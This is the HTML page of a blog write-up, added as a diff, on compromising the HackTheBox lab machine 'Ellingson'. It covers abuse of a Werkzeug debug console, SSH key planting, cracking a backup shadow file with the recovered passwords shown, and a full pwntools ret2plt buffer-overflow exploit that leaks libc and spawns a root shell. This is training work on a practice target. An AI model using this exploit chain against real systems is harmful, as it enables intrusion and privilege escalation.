@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+  <head>
+  <meta charset="utf-8" />
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <title>HackTheBox - WriteUp 9 &middot; Pat~ Pat~ Meow~</title>
+  <meta name="description" content="HackTheBox 练手" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" />
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://www.kmahyyg.xyz/css/main.min.css" />
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-123948588-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+  <style>
+    body {
+      background: #ecedef url("https://alicdn.kmahyyg.xyz/asset_files/aether/bgimg.webp") repeat;
+    }
+  </style>
+</head>
+  <body class="single-body">
+    <nav class="nav-bar side-padding">
+  <h1 class="nav-header"><a href="https://www.kmahyyg.xyz/" class="nav-text">Patrick Young</a></h1>
+  <div class="hamburger-menu">
+    <button onclick="hamburgerMenuPressed.call(this)" aria-haspopup="true" aria-expanded="false" aria-controls="menu" aria-label="Menu">
+      <span></span>
+      <span></span>
+    </button>
+    <ul id="menu" class="hamburger-menu-overlay">
+      <li><a href="https://www.kmahyyg.xyz/" class="hamburger-menu-overlay-link">Home</a></li>
+      <li><a href="https://www.kmahyyg.xyz/express-page/" class="hamburger-menu-overlay-link">Express Inc</a></li>
+      <li><a href="https://www.kmahyyg.xyz/about-me-page/" class="hamburger-menu-overlay-link">About</a></li>
+      <li><a href="https://www.kmahyyg.xyz/archlinux-bug-page/" class="hamburger-menu-overlay-link">Arch Linux</a></li>
+      <li><a href="https://www.kmahyyg.xyz/donate-page/" class="hamburger-menu-overlay-link">Donate</a></li>
+      <li><a href="https://www.kmahyyg.xyz/categories/code" class="hamburger-menu-overlay-link">Code</a></li><li><a href="https://www.kmahyyg.xyz/categories/life" class="hamburger-menu-overlay-link">Life</a></li><li><a href="https://www.kmahyyg.xyz/categories/network" class="hamburger-menu-overlay-link">Network</a></li><li><a href="https://www.kmahyyg.xyz/categories/school" class="hamburger-menu-overlay-link">School</a></li><li><a href="https://www.kmahyyg.xyz/categories/tech" class="hamburger-menu-overlay-link">Tech</a></li>
+    </ul>
+  </div>
+</nav>
+    <main class="content side-text-padding">
+      <article class="post ">
+        <header class="post-header">
+        	<h1 class="post-title">HackTheBox - WriteUp 9</h1>
+          <p class="post-date">Posted <time datetime="2019-07-04">Jul 4, 2019</time></p>
+        </header>
+        
+        <picture class="post-figure">
+            
+            <source srcset="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp">
+          <img src="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp" >
+        </picture>
+        
+        
+
+<h1 id="ellingson">Ellingson</h1>
+
+<p>Nmap first, 80 HTTP Apache and 22 SSH.</p>
+
+<h2 id="user">User</h2>
+
+<p>Generate a key pair of SSH for preparation.</p>
+
+<p>Check the pages, you&rsquo;ll find URL: <a href="http://10.10.10.139/articles/2">http://10.10.10.139/articles/2</a></p>
+
+<p>Then let the article ID &ldquo;overflow&rdquo;ed, then You&rsquo;ll be able to see the debug console of Python Werkzeug.</p>
+
+<p>Use the console to execute shell command, currently logged in as <code>hal</code>.</p>
+
+<p>This user <code>~/.ssh/authorized_keys</code> is allowed to write, so write the public key you just generated to the <code>authorized_keys</code>. Then access it with SSH.</p>
+
+<p>After that, run LinEnum, <code>/var/backups/shadow.bak</code> is found and is readable. Access it, crack the hash in it, found another credentials: <code>margo:iamgod$08</code> and <code>plague:password123</code></p>
+
+<p>Login as margo, You have the access with <code>user.txt</code> now.  <code>plague</code> is totally useless here and cannot login.</p>
+
+<h2 id="root">Root</h2>
+
+<p>Run LinEnum again, found SUID file <code>/usr/bin/garbage</code>. Kernel is relatively newer version. So DirtyCow CANNOT be used here.</p>
+
+<p>But the <code>gdb</code> is not installed. Check the libc with <code>ldd /usr/bin/garbage</code> to get the glibc file path and download both files.</p>
+
+<p>There&rsquo;s a buffer overflow approach with <code>ret2plt</code> method.</p>
+
+<p>Before we continue, I strongly suggest you read the following referrence to get the knowledge you may need:</p>
+
+<ul>
+<li><a href="https://linux-audit.com/elf-binaries-on-linux-understanding-and-analysis/">ELF 101</a></li>
+<li><a href="https://www.airs.com/blog/archives/38">Series Article about ELF</a></li>
+<li><a href="https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html">PLT &amp; GOT - Code sharing with dynamic libraries</a></li>
+<li><a href="https://www.youtube.com/watch?reload=9&amp;v=6S4A2nhHdWg">ippsec: Bitterman On Youtube</a></li>
+<li><a href="http://6.035.scripts.mit.edu/sp17/x86-64-architecture-guide.html">Arguments passed in a function call in x64 machine</a></li>
+</ul>
+
+<p>Since we know the basic knowledge, <code>chmod +s ./garbage</code> we downloaded to simulate the environment.</p>
+
+<p>So next, run <code>ltrace ./garbage</code>,  you will find the password it wanted. However, this is totally useless.</p>
+
+<p>So in fact, it is a buffer overflow here.</p>
+
+<p>As my blog post <a href="/hioscp/2019-htb-writeup5.md">HTB: Solidstate</a> told, just create pattern <code>pattern create 150</code>, and insert, then use <code>info frame</code>  to get saved %rip , use <code>pattern offset 0x41416d4141514141</code> to get : <code>4702159612987654465 found at offset: 136</code>.</p>
+
+<p>Run <code>checksec</code> first, get ASLR fully-enabled and 64-bit Kernel with NX enabled, RELRO partial.</p>
+
+<p>Since this is x64 machine, we cannot use bruteforce to crack the libc base address. We have to use <code>ret2plt</code> here. About the finding of specific function address, check the comment in the next file, finally, the exploit as here:</p>
+
+<pre><code class="language-python">#!/usr/bin/env python2
+
+from pwn import *
+
+# this program must be initiated with UID 1002, told by IDA reverse.
+
+context(os=&quot;linux&quot;, arch=&quot;amd64&quot;)   # amd64 = x64 little-endian, ia64 = x64 big-endian
+context.log_level = 'DEBUG'
+libc = ELF(&quot;./r_libc.so.6&quot;)
+session = ssh(&quot;margo&quot;, &quot;10.10.10.139&quot;, password=&quot;iamgod$08&quot;)
+p = session.process('/usr/bin/garbage')
+
+#p = gdb.debug('./garbage')
+
+junk = &quot;\x90&quot; * 136
+
+# Stage 1: pop-ret-rdi get libc base
+# Find the pop_rdi via radare2(BUT BUGS HERE, SO USE ROPPER INSTEAD):  r2 ./garbage -&gt; /R blahblah
+# Disassemble the ELF and find function: odjdump -D ./garbage | grep blahblah
+# Disassemble the ELF and find PLT: objdump -d ./garbage -j .plt
+# Find the pop_rdi via ropper: ropper -f ./garbage --search &quot;pop rdi&quot; 
+# Outupt of puts disassembled via objdump (the contents inside [] is also comments):  [Linked Call Address in Binary]  401050:       ff 25 d2 2f 00 00       jmpq   *0x2fd2(%rip)        # 404028 [Address in GOT] &lt;puts@GLIBC_2.2.5&gt;
+
+plt_puts = p64(0x401050)
+got_puts = p64(0x404028)
+pop_rdi = p64(0x40179b)
+plt_main = p64(0x401619)
+
+# x86_64 put all args in registers instead of stack in memory
+# pop_rdi used to send params to system function call
+
+# get the puts address in GOT
+# the ELF working procedure is: load library -&gt; relocation, call function via PLT stub -&gt; patch the GOT table with address the libraries loaded in 
+# payload1 will give you the address puts@GLIBC loaded in at runtime in GOT
+payload1 = junk + pop_rdi + got_puts + plt_puts + plt_main
+
+p.sendline(payload1)
+p.recvuntil(&quot;access denied.&quot;)
+
+# Receive the result and only accept the first 8 bytes(64 bits), remove the LF
+# If length != 8, left-justify it to 8 bytes and use the padding of \x00
+leaked_puts = p.recv()[:8].strip().ljust(8, &quot;\x00&quot;)
+
+log.success(&quot;Leaked puts@GLIBC: &quot; + str(leaked_puts))
+
+# Stage 2: according to base, get the offset
+
+# Get the related function address of so file
+# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
+# strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
+
+leaked_puts = u64(leaked_puts)
+libc_puts = libc.symbols['puts']
+libc_base = leaked_puts - libc_puts
+libc_system = libc.symbols['system']
+libc_sh = libc.search('/bin/sh').next()
+libc_setuid = libc.symbols['setuid']
+
+# Param of setuid(0)
+nullparam = p64(0x0)
+
+# Function addresses in the garbage at runtime
+systemAddr = p64(libc_base + libc_system)
+shAddr = p64(libc_base + libc_sh)
+setuidAddr = p64(libc_base + libc_setuid)
+
+# setuid(0) + system('/bin/sh')
+payload2 = junk + pop_rdi + nullparam + setuidAddr + pop_rdi + shAddr + systemAddr
+
+p.sendline(payload2)
+p.recvuntil(&quot;access denied.&quot;)
+
+p.interactive()
+</code></pre>
+
+<p>(END)</p>
+
+      </article>
+      <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "kmahyyg" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+    </main>
+    <nav class="end-nav side-padding">
+      
+      <a ontouchstart="cardPressed.call(this)" ontouchend="cardReleased.call(this)" ontouchmove="cardReleased.call(this)" 
+  href="https://www.kmahyyg.xyz/hioscp/2019-htb-writeup9/" class="card blog-card" rel="bookmark" >
+    
+    <div class="card-img-container">
+      <p class="card-img-overlay">Next Article</p>
+      <picture>
+        
+        <source srcset="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp">
+        <img src="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp" class="card-img" >
+      </picture>
+    </div>
+    
+  <article class="card-body">
+    <h2 class="card-title">HackTheBox - WriteUp 9</h2>
+    <p class="card-text">HackTheBox 练手</p>
+    <div class="card-subtext muted-text">
+      <p>Posted <time datetime="2019-06-18 618:00">Jun 18, 2019</time></p>
+      <p>#tech </p>
+    </div>
+  </article>
+</a>
+      
+      <a ontouchstart="cardPressed.call(this)" ontouchend="cardReleased.call(this)" ontouchmove="cardReleased.call(this)" 
+  href="https://www.kmahyyg.xyz/" class="card home-card" style="background-image: url( https://alicdn.kmahyyg.xyz/asset_files/aether/backtohome.webp )" rel="bookmark" >
+  Home
+</a>
+    </nav>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/highlight.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous"
+    onload="renderMathInElement(document.body);"></script>
+<script src="https://www.kmahyyg.xyz/js/core.js"></script>
+<script>
+  hljs.initHighlightingOnLoad();
+</script>
+  </body>
+</html>
